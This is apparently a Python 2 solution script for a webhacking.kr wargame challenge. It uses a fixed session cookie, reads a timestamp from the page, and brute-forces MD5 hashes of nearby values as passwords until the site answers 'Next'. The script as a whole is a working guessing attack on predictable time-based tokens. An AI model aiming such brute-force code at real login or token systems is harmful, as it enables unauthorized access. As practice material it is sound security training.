import requests
import hashlib

cookies = {"PHPSESSID": "2decc47b5313e0d64ccda07b11df6a79"}
url = "http://webhacking.kr/challenge/bonus/bonus-6/l4.php"
r = requests.get(url, cookies=cookies)
time = r.text.split(":")[2][1:-1]
check = int(time)
for i in range(100) :
    check = check+i
    password = hashlib.md5(str(check)).hexdigest()
    r = requests.get(url+"?password=%s"%password, cookies=cookies)
    if "Next" in r.text :
        print r.text
        break
    print i